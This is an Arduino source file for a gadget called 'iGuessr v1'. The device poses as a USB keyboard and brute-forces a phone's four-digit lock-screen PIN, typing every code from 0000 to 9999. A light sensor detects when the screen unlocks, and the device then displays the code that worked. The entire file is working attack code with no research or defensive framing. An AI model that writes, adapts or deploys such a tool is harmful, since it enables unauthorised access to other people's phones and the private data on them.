#include <Adafruit_GFX.h>    // Core graphics library
#include <Adafruit_TFTLCD.h> // Hardware-specific library

#define LIGHT_SENSOR A5     // Analog pin for the light sensor
#define LIGHT_THRESHOLD 70 // Change threshold

#define LCD_CS A3 // Chip Select goes to Analog 3
#define LCD_CD A2 // Command/Data goes to Analog 2
#define LCD_WR A1 // LCD Write goes to Analog 1
#define LCD_RD A0 // LCD Read goes to Analog 0

#define LCD_RESET A4 // Can alternately just connect to Arduino's reset pin

// USB Keyboard scancodes
#define KEY_1 0x1e  //Number: 1
#define KEY_2 0x1f  //Number: 2
#define KEY_3 0x20  //Number: 3
#define KEY_4 0x21  //Number: 4
#define KEY_5 0x22  //Number: 5
#define KEY_6 0x23  //Number: 6
#define KEY_7 0x24  //Number: 7
#define KEY_8 0x25  //Number: 8
#define KEY_9 0x26  //Number: 9
#define KEY_0 0x27  //Number: 0

// Turning funky hex into a readable words
#define BLACK   0x0000 
#define WHITE   0xFFFF

uint8_t buf[8] = { 0 }; // Keyboard report buffer
Adafruit_TFTLCD tft(LCD_CS, LCD_CD, LCD_WR, LCD_RD, LCD_RESET);

int lastLightValue = 0;

void setup() { // Setting up the TFT and Keyboard
  tft.reset();
  uint16_t identifier = tft.readID();
  tft.begin(identifier);
  tft.fillScreen(BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(WHITE);  tft.setTextSize(1);
  Serial.begin(9600);
  randomSeed(analogRead(0));
  delay(1000);
  int lightValue = analogRead(LIGHT_SENSOR); // Read light sensor value
  lastLightValue = lightValue;
}

void loop() {

  for (int i = 0; i <= 9999; i++) {
    // Extract individual digits
    int d[4];
    d[0] = i / 1000 % 10; // thousands
    d[1] = i / 100 % 10;  // hundreds
    d[2] = i / 10 % 10;   // tens
    d[3] = i % 10;        // ones
    
    // Send each digit
    for (int j = 0; j < 4; j++) {
      sendKeyPress(getKeyHexValue(d[j]));
      delay(100);
    }
    delay(6000); // Delay before sending next code
  }
}

void sendKeyPress(uint8_t key) {
  static String Lcode = "0000";
  static int digitCount = 0;
  static String codeString = "";
  static int linesPrinted = 0;

  buf[2] = key; // Set the key to be sent
  Serial.write(buf, 8); // Send keypress

  // Convert the key value to the corresponding digit character
  char digitChar;
  switch (key) {
    case KEY_0: digitChar = '0'; break;
    case KEY_1: digitChar = '1'; break;
    case KEY_2: digitChar = '2'; break;
    case KEY_3: digitChar = '3'; break;
    case KEY_4: digitChar = '4'; break;
    case KEY_5: digitChar = '5'; break;
    case KEY_6: digitChar = '6'; break;
    case KEY_7: digitChar = '7'; break;
    case KEY_8: digitChar = '8'; break;
    case KEY_9: digitChar = '9'; break;
    default: digitChar = '?'; break; // Unknown key
  }

  // Add the digit character to the code string
  codeString += digitChar;
  digitCount++;

  int lightValue = analogRead(LIGHT_SENSOR); // Read light sensor value

  if (abs(lightValue - lastLightValue) > LIGHT_THRESHOLD) {
    // Stop and display message
    tft.fillScreen(BLACK);
    tft.setCursor(0, 0);
    tft.setTextColor(WHITE);
    tft.setTextSize(1);
    tft.setTextSize(2);
    tft.println("     iGuessr v1");
    tft.setTextSize(1);
    tft.println();
    tft.println("YO! The light sensor detected something!"); 
    tft.println("Seems like the phone unlocked!");
    tft.println();
    tft.print("Last entered code was: ");
    tft.println(Lcode);
    tft.println();
    tft.println("If the code didn't work try going down a few digits.");
    tft.println();
    tft.println("Good luck!");
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);
    while(1); // Infinite loop to halt execution
  }

  lastLightValue = lightValue; // Update last light value

  // When four digits have been added, print them on TFT and reset
  if (digitCount == 4) {
    // Clear LCD and reset cursor after 29 lines
    if (linesPrinted == 39) {
      tft.fillScreen(BLACK);
      tft.setCursor(0, 0); // Reset cursor position
      linesPrinted = 0; // Reset lines printed counter
    }
    tft.setTextColor(WHITE);
    tft.setTextSize(1);
    tft.print("Testing Code: ");
    tft.println(codeString); // Print the code string
    Lcode = codeString;

    codeString = ""; // Clear the code string
    digitCount = 0;
    linesPrinted++; // Increment lines printed counter
  }

  releaseKey(); // Release the key

}


void releaseKey() {
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8); // Release key
  delay(10); // Delay to ensure the key is released
}

uint8_t getKeyHexValue(int digit) {
  switch (digit) {
    case 0: return KEY_0;
    case 1: return KEY_1;
    case 2: return KEY_2;
    case 3: return KEY_3;
    case 4: return KEY_4;
    case 5: return KEY_5;
    case 6: return KEY_6;
    case 7: return KEY_7;
    case 8: return KEY_8;
    case 9: return KEY_9;
    default: return 0; // Invalid digit
  }
}